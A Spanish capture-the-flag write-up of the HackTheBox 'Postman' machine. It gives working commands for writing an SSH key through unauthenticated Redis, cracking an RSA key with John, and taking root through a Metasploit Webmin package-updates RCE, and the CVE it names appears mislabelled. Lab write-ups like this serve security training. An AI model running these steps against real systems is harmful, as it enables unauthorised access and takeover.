@@ -1,0 +1,115 @@
+TÍTULO: HackTheBox — Postman (Writeup)
+AUTOR: zSodex
+FECHA: Mar 27, 2025
+URL: https://medium.com/@zsodex/hackthebox-postman-3c64a56bc410
+
+════════════════════════════════════════════════════════════
+
+Autor: zSodex
+Dificultad: Easy
+
+Técnicas clave:
+- Redis → Inyección de clave SSH
+- Crackeo de clave RSA privada
+- Explotación de Webmin (RCE)
+
+────────────────────────────────────────────────────────────
+🔍 Fase de Reconocimiento
+────────────────────────────────────────────────────────────
+
+Escaneo básico de Nmap:
+
+    nmap -v --min-rate 5000 -sV -p- 10.10.10.160 -oN nmap
+
+Hallazgos clave:
+✅ Puerto 6379 (Redis): Abierto y sin autenticación.
+✅ Puerto 10000 (Webmin): Versión 1.910 (¡posible vulnerabilidad!).
+
+Redis sin autenticación es peligroso ya que permite escribir archivos arbitrarios.
+
+────────────────────────────────────────────────────────────
+⚡ Explotación de Redis (Inyección de Clave SSH)
+────────────────────────────────────────────────────────────
+
+Fuente: https://hackviser.com/tactics/pentesting/services/redis
+
+Redis permite:
+- Modificar directorios (config set dir)
+- Guardar datos en archivos (SAVE)
+
+Pasos:
+
+1. Generar clave SSH (sin passphrase):
+
+    ssh-keygen -t ecdsa -b 521 -f key -N ""
+
+2. Formatear para Redis:
+
+    (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
+
+3. Inyectar en Redis:
+
+    cat key.txt | redis-cli -h 10.10.10.160 -x set pwn
+    redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh
+    redis-cli -h 10.10.10.160 config set dbfilename "authorized_keys"
+    redis-cli -h 10.10.10.160 save
+
+4. Conectarse:
+
+    chmod 600 key
+    ssh -i key redis@10.10.10.160
+    # ¡Acceso como redis!
+
+────────────────────────────────────────────────────────────
+🔑 Escalada a Matt (Crackeo de RSA)
+────────────────────────────────────────────────────────────
+
+Hallazgo clave en /opt/id_rsa.bak: clave RSA privada encriptada.
+
+Proceso:
+
+1. Extraer hash con ssh2john:
+
+    python3 /usr/share/john/ssh2john.py id_rsa.bak > id_rsa.hash
+
+2. Crackear con John:
+
+    john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+
+Contraseña obtenida: computer2008
+
+Intento fallido por SSH → probé las credenciales en Webmin.
+
+────────────────────────────────────────────────────────────
+💻 Explotación de Webmin (RCE como Root)
+────────────────────────────────────────────────────────────
+
+Acceso inicial:
+- URL: https://10.10.10.160:10000
+- Credenciales: matt:computer2008 → ¡Funcionó!
+
+Webmin 1.910 es vulnerable al CVE-2019-15107 (RCE en actualizaciones de paquetes).
+
+Explotación con Metasploit:
+
+    msfconsole
+    use exploit/linux/http/webmin_package_updates_rce
+    set RHOSTS 10.10.10.160
+    set USERNAME matt
+    set PASSWORD computer2008
+    set SSL true
+    exploit
+
+¡Shell como root!
+
+────────────────────────────────────────────────────────────
+📌 Lecciones Aprendidas
+────────────────────────────────────────────────────────────
+
+1. Redis sin autenticar: Siempre es un vector potencial de ataque (permite escritura arbitraria).
+2. Reutilización de credenciales: La contraseña de la RSA sirvió para Webmin.
+3. Webmin desactualizado: RCE trivial con exploits públicos.
+
+════════════════════════════════════════════════════════════
+FIN DEL ARTÍCULO
+════════════════════════════════════════════════════════════
